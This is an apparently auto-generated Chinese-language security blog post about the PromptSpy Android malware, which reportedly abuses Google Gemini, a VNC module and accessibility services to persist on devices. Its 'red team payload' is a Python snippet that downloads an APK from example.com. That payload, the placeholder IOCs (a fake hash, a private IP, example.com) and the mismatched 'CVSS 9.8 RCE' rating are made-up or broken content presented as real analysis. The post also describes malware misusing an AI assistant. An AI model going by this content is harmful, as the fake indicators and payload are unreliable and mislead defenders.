---
layout: post
title:  "新型態安卓惡意軟體PromptSpy濫用Gemini持續在受害裝置活動"
date:   2026-02-23 12:47:44 +0000
categories: [security]
severity: critical
---

# 🚨 解析 PromptSpy：AI 助力下的安卓惡意軟體

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: AI 助力、VNC 模組、無障礙服務繞過

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: PromptSpy 惡意軟體利用 AI 助力技術，透過 Google Gemini 判讀受害裝置的螢幕畫面，確保惡意程式持續執行。
* **攻擊流程圖解**:
  1. 使用者下載並安裝 PromptSpy 惡意軟體。
  2. PromptSpy 啟動 VNC 模組，允許攻擊者遠端操控受害裝置。
  3. PromptSpy 利用無障礙服務，阻撓受害者移除或停用惡意程式。
* **受影響元件**: Android 4.4 以上版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 受害者需要安裝 PromptSpy 惡意軟體。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 下載 PromptSpy 惡意軟體
    response = requests.get("https://example.com/promptspy.apk")
    with open("promptspy.apk", "wb") as f:
        f.write(response.content)
    
    # 啟動 VNC 模組
    vnc_module = "vnc_module"
    requests.post("https://example.com/vnc_module", data={"vnc_module": vnc_module})
    
    ```
* **繞過技術**: PromptSpy 利用無障礙服務，阻撓受害者移除或停用惡意程式。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /data/app/promptspy.apk |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule PromptSpy {
      meta:
        description = "Detect PromptSpy malware"
      strings:
        $a = "promptspy.apk"
      condition:
        $a in (0..filesize)
    }
    
    ```
* **緩解措施**: 升級 Android 版本至 10 以上，啟用 Google Play Protect。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **AI 助力**: 利用人工智慧技術，協助惡意軟體執行攻擊任務。
* **VNC 模組**: 虛擬網路計算模組，允許攻擊者遠端操控受害裝置。
* **無障礙服務**: Android 系統提供的無障礙服務，允許應用程式存取系統功能。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.ithome.com.tw/news/174001)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


